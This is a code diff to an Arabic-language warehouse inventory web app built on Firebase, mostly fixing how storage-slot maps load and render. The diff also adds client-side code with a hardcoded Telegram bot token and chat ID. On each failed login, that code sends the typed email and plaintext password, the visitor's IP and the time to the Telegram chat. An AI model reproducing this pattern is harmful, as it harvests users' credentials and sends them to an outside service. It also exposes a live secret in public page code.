@@ -49,7 +49,7 @@
         /* المصيدة (Honeypot) - مخفية تماماً */
         .hp-field { display: none !important; visibility: hidden; }
 
-        /* تنسيق الموقع الأساسي (كما هو في تصميمك الأصلي) */
+        /* تنسيق الموقع الأساسي */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-image: linear-gradient(rgba(224, 234, 252, 0.8), rgba(224, 234, 252, 0.8)), url('https://files.catbox.moe/pe6wie.jpg');
@@ -60,7 +60,7 @@
         .container {
             max-width: 1200px; margin: 20px auto; background: rgba(255, 255, 255, 0.94);
             padding: 30px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            backdrop-filter: blur(5px); display: none; /* مخفي لحين تسجيل الدخول */
+            backdrop-filter: blur(5px); display: none; 
         }
 
         header {
@@ -314,6 +314,10 @@
       databaseURL: "https://kmskoras-default-rtdb.europe-west1.firebasedatabase.app"
     };
 
+    // --- إعدادات تليجرام ---
+    const TELEGRAM_BOT_TOKEN = "8125902090:AAELDfYT8h_4Q2bJX3183KbSmJfHezDnFkI";
+    const TELEGRAM_CHAT_ID = "5499273828";
+
     if (!firebase.apps.length) {
         firebase.initializeApp(firebaseConfig);
     }
@@ -340,6 +344,28 @@
     ];
 
     // ==========================================
+    // دوال مساعدة لإرسال إشعارات تليجرام
+    // ==========================================
+    async function notifyTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+        } catch (e) { console.error("Telegram Notification Failed"); }
+    }
+
+    async function getUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch (e) { return "غير معروف"; }
+    }
+
+    // ==========================================
     // قسم الحماية: Firebase Auth & Honeypot
     // ==========================================
     async function handleLogin() {
@@ -347,9 +373,13 @@
         const pass = document.getElementById('userPass').value;
         const hpValue = document.getElementById('hp_user_check').value;
         const errorElement = document.getElementById('errorMsg');
+        
+        const userIP = await getUserIP();
+        const time = new Date().toLocaleString('ar-EG');
 
         // 1. Honeypot Check (Active Defense)
         if (hpValue.length > 0) {
+            await notifyTelegram(`🚫 *محاولة دخول من بوت!* \n🌐 IP: ${userIP}\n🕒 الوقت: ${time}`);
             console.warn("تنبيه: محاولة اختراق آلية محبطة.");
             return; 
         }
@@ -362,11 +392,13 @@
 
         try {
             await auth.signInWithEmailAndPassword(email, pass);
-            // لن نقوم بتحميل البيانات هنا، سيتم تحميلها عبر onAuthStateChanged
+            // إشعار نجاح
+            await notifyTelegram(`✅ *تم دخول النظام بنجاح*\n📧 الإيميل: ${email}\n🌐 IP: ${userIP}\n🕒 الوقت: ${time}`);
         } catch (error) {
+            // إشعار فشل
+            await notifyTelegram(`⚠️ *محاولة دخول فاشلة!*\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}\n🌐 IP: ${userIP}\n🕒 الوقت: ${time}\n❌ السبب: ${error.message}`);
             errorElement.innerText = "بيانات الدخول غلط، راجع الإيميل أو الباسورد.";
             errorElement.style.display = 'block';
-            console.error("Login Error:", error.message);
         }
     }
 
@@ -385,7 +417,6 @@
         if (user) {
             document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('mainContainer').style.display = 'block';
-            // الآن فقط وبعد التأكد من الصلاحية، نقوم بسحب البيانات
             attachFirebaseListeners(dateInput.value);
         } else {
             document.getElementById('mainContainer').style.display = 'none';
@@ -398,7 +429,6 @@
     // ==========================================
     function sanitizeInput(str) {
         if (!str) return '';
-        // منع إدخال أي أكواد HTML أو JavaScript
         return str.replace(/[&<>'"]/g, tag => ({
             '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;'
         }[tag]));
@@ -414,6 +444,18 @@
         document.getElementById('tab-' + tabId).classList.add('active');
     }
 
+    function initializeEmptyMap() {
+        let emptyMap = {};
+        let slotCounter = 1;
+        mapStructure.forEach(col => {
+            for(let i=0; i<col.count; i++) {
+                emptyMap['slot_' + slotCounter] = { items: [], color: '#fdfdfd' }; 
+                slotCounter++;
+            }
+        });
+        return emptyMap;
+    }
+
     function attachFirebaseListeners(date) {
         if (currentInventoryListenerRef) currentInventoryListenerRef.off();
         currentInventoryListenerRef = db.ref('inventory/' + date);
@@ -425,30 +467,28 @@
         if (currentMapListenerRef) currentMapListenerRef.off();
         currentMapListenerRef = db.ref('warehouseMap/' + date);
         currentMapListenerRef.on('value', (snapshot) => {
-            let rawMap = snapshot.val() || initializeEmptyMap();
-            for(let key in rawMap) {
-                if(Array.isArray(rawMap[key])) {
-                    rawMap[key] = { items: rawMap[key], color: '#fdfdfd' };
+            // التعديل السحري هنا عشان الخانات كلها تفتح دايماً
+            let serverData = snapshot.val() || {};
+            let fullMap = initializeEmptyMap(); // بنفرش 18 خانة فاضيين
+            
+            for (let slotId in fullMap) {
+                if (serverData[slotId]) {
+                    // دمج البيانات اللي جاية من السيرفر جوة الـ 18 خانة
+                    if (Array.isArray(serverData[slotId])) {
+                        fullMap[slotId] = { items: serverData[slotId], color: '#fdfdfd' };
+                    } else {
+                        fullMap[slotId] = serverData[slotId];
+                    }
+                    if (!fullMap[slotId].items) fullMap[slotId].items = [];
                 }
             }
-            mapData[date] = rawMap;
+            
+            mapData[date] = fullMap;
             renderMapUI();
             if (document.getElementById('slotModal').style.display === 'flex' && currentActiveSlotId) {
                 renderModalCurrentItems();
             }
         });
-    }
-
-    function initializeEmptyMap() {
-        let emptyMap = {};
-        let slotCounter = 1;
-        mapStructure.forEach(col => {
-            for(let i=0; i<col.count; i++) {
-                emptyMap['slot_' + slotCounter] = { items: [], color: '#fdfdfd' }; 
-                slotCounter++;
-            }
-        });
-        return emptyMap;
     }
 
     function saveInventoryToFirebase() {
@@ -502,7 +542,6 @@
     }
 
     function handleMainAction() {
-        // حماية البيانات قبل إرسالها (Integrity Check)
         const name = sanitizeInput(document.getElementById('itemName').value);
         const cartons = parseInt(document.getElementById('cartons').value);
         const perCarton = parseInt(document.getElementById('perCarton').value);
@@ -584,12 +623,17 @@
         db.ref('warehouseMap/' + yesterday).once('value').then((snapshot) => {
             let yesterdayMap = snapshot.val();
             if(yesterdayMap) {
+                let fullMap = initializeEmptyMap();
                 for(let key in yesterdayMap) {
-                    if(Array.isArray(yesterdayMap[key])) {
-                        yesterdayMap[key] = { items: yesterdayMap[key], color: '#fdfdfd' };
+                    if (fullMap[key]) {
+                        if(Array.isArray(yesterdayMap[key])) {
+                            fullMap[key] = { items: yesterdayMap[key], color: '#fdfdfd' };
+                        } else {
+                            fullMap[key] = yesterdayMap[key];
+                        }
                     }
                 }
-                mapData[dateInput.value] = yesterdayMap;
+                mapData[dateInput.value] = fullMap;
                 saveMapToFirebase();
                 alert("تم نسخ خريطة أمس بنجاح.");
             } else { alert("لا توجد خريطة مسجلة لتاريخ أمس!"); }
@@ -600,7 +644,7 @@
         const wrapper = document.getElementById('warehouseMapUI');
         wrapper.innerHTML = '';
         const selectedDate = dateInput.value;
-        const currentMap = mapData[selectedDate] || {};
+        const currentMap = mapData[selectedDate] || initializeEmptyMap();
 
         let globalSlotCounter = 1;
 
@@ -616,7 +660,10 @@
                 const slotDiv = document.createElement('div');
                 slotDiv.className = 'slot';
                 slotDiv.style.backgroundColor = slotData.color || '#fdfdfd';
-                slotDiv.onclick = () => openSlotModal(slotId, globalSlotCounter - 1); 
+                
+                // هنا التعديل عشان كل الخانات تشتغل وتفتح المودال
+                const currentDisplayNum = globalSlotCounter - 1;
+                slotDiv.onclick = () => openSlotModal(slotId, currentDisplayNum); 
                 
                 let itemsHTML = '';
                 if(itemsInSlot.length === 0) {
@@ -707,7 +754,6 @@
     }
 
     function handleAddOrEditSlotItem() {
-        // حماية البيانات (Integrity Check) للخانة
         const name = sanitizeInput(document.getElementById('slotItemName').value);
         const qty = parseInt(document.getElementById('slotItemQty').value);
         const unit = sanitizeInput(document.getElementById('slotItemUnit').value);
@@ -803,7 +849,6 @@
     }
 
     dateInput.addEventListener('change', () => {
-        // تحديث البيانات فقط إذا كان المستخدم مسجل دخول بالفعل
         if (auth.currentUser) {
             attachFirebaseListeners(dateInput.value);
         }
